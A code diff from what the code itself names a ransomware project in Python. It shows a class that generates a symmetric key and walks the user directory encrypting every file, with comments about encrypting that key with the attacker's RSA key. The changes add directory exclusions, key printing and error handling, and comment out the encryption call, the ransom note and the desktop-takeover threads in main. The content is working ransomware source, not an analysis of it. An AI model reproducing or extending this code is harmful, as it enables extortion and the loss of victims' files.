@@ -59,13 +59,18 @@ class RansomWare:
     def generate_key(self):
         # Generates url safe(base64 encoded) key
         self.key = Fernet.generate_key()
+        print(f"Fernet Key {self.key}")
         # Creates a Fernet object with encrypt/decrypt methods
         self.crypter = Fernet(self.key)
+        print(f"Crypter {self.crypter}")
     
     # Write the fernet(symmetric key) to text file
     def write_key(self):
-        with open('fernet_key.txt', 'wb') as f:
-            f.write(self.key)
+        try:
+            with open('fernet_key.txt', 'wb') as f:
+                f.write(self.key)
+        except Exception as e:
+            print(f"Error While Writing into fernet_key.txt: {e}")
 
     # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
     # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
@@ -132,16 +137,21 @@ class RansomWare:
                     self.crypt_file(file_path, encrypted=True)
 
     def crypt_system(self, encrypted=False):
+
+        excluded_dirs = ['AppData', 'Local', 'Programs\Python']
+        excluded_files = ['desktop.ini']  # Add more as needed
+
         # Walk through all directories and files in C:\Users
         for root, dirs, files in os.walk(self.localRoot, topdown=True):
+            dirs[:] = [d for d in dirs if d not in excluded_dirs]
             for file in files:
+                if file in excluded_files:
+                    continue
                 file_path = os.path.join(root, file)
-                # Optionally, you can add a condition to filter files
-                # Encrypt or decrypt the file
                 try:
                     self.crypt_file(file_path, encrypted)
                 except Exception as e:
-                    print(f"Error encrypting {file_path}: {e}")
+                    print(f"Error processing {file_path}: {e}")
 
     @staticmethod
     def what_is_bitcoin():
@@ -304,21 +314,21 @@ def main():
     # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
     rw = RansomWare()
     rw.generate_key()
-    rw.crypt_system()
+    # rw.crypt_system()
     rw.write_key()
-    rw.encrypt_fernet_key()
-    rw.change_desktop_background()
-    rw.what_is_bitcoin()
-    rw.ransom_note()
+    # rw.encrypt_fernet_key()
+    # rw.change_desktop_background()
+    # rw.what_is_bitcoin()
+    # rw.ransom_note()
 
-    t1 = threading.Thread(target=rw.show_ransom_note)
-    t2 = threading.Thread(target=rw.put_me_on_desktop)
+    # t1 = threading.Thread(target=rw.show_ransom_note)
+    # t2 = threading.Thread(target=rw.put_me_on_desktop)
 
-    t1.start()
+    # t1.start()
     print('> RansomWare: Attack completed on target machine and system is encrypted')  # Debugging/Testing
     print('> RansomWare: Waiting for attacker to give target machine document that '
           'will un-encrypt machine')  # Debugging/Testing
-    t2.start()
+    # t2.start()
     print('> RansomWare: Target machine has been un-encrypted')  # Debugging/Testing
     print('> RansomWare: Completed')  # Debugging/Testing
 
